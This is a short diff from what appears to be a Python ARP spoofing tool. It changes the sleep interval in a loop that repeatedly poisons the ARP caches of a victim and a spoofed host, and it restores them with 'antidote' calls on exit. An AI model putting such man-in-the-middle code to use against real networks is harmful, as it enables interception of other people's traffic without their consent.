@@ -35,7 +35,7 @@ if __name__ == "__main__":
         while True:
             poison(spoof_ip, spoof_mac, victim_ip)
             poison(victim_ip, victim_mac, spoof_ip)
-            time.sleep(1)
+            time.sleep(2)
     except:
         antidote(victim_ip, victim_mac, spoof_ip, spoof_mac)
         antidote(spoof_ip, spoof_mac, victim_ip, victim_mac)
